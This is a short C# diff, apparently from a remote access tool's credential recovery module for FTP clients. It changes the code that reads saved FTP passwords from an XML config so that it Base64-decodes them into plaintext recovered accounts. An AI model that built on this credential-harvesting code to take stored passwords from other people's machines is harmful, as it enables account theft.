@@ -40,7 +40,7 @@ namespace xClient.Core.Recovery.FtpClients
                             if (xmlNodeChild.Name == "User")
                                 szUsername = xmlNodeChild.InnerText;
                             if (xmlNodeChild.Name == "Pass")
-                                szPassword = xmlNodeChild.InnerText;
+                                szPassword = Base64Decode(xmlNodeChild.InnerText);
                         }
 
                         data.Add(new RecoveredAccount
